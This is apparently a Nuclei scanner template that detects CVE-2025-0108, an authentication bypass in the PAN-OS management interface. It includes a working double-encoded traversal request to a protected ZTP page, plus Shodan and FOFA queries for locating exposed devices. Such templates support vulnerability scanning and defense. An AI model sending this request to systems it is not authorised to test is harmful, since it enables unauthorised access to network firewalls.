id: CVE-2025-0108

info:
  name: PAN-OS Management Interface - Path Confusion to Authentication Bypass
  author: halencarjunior,ritikchaddha
  severity: critical
  description: |
    A vulnerability in PAN-OS management interface allows authentication bypass through path confusion between Nginx and Apache handlers.The issue occurs due to differences in path processing between Nginx and Apache, where double URL encoding combined with directory traversal can bypass authentication checks enforced by X-pan-AuthCheck header.
  reference:
    - https://slcyber.io/blog/nginx-apache-path-confusion-to-auth-bypass-in-pan-os/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2025-0108
    cwe-id: CWE-287
  metadata:
    verified: true
    max-request: 1
    vendor: paloaltonetworks
    product: pan-os
    fofa-query: icon_hash="-631559155"
    shodan-query:
      - cpe:"cpe:2.3:o:paloaltonetworks:pan-os"
      - http.favicon.hash:"-631559155"
  tags: cve,cve2025,panos,auth-bypass,kev

http:
  - method: GET
    path:
      - "{{BaseURL}}/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css"

    matchers:
      - type: dsl
        dsl:
          - 'contains_any(body, "<title>Zero Touch Provisioning", "Zero Touch Provisioning (ZTP)")'
          - 'contains(header, "text/html")'
          - 'status_code == 200'
        condition: and
# digest: 4a0a00473045022100c82ff6820de4b488709b3e68c7fbbc6ae8249b0991e45dd9a8b3ec98aca58f2202202fb3af209d54d7de2b276ad45735ea3ff0422cf118f5abc1e4e85dc8a144cfa3:922c64590222798bb761d5b6d8e72950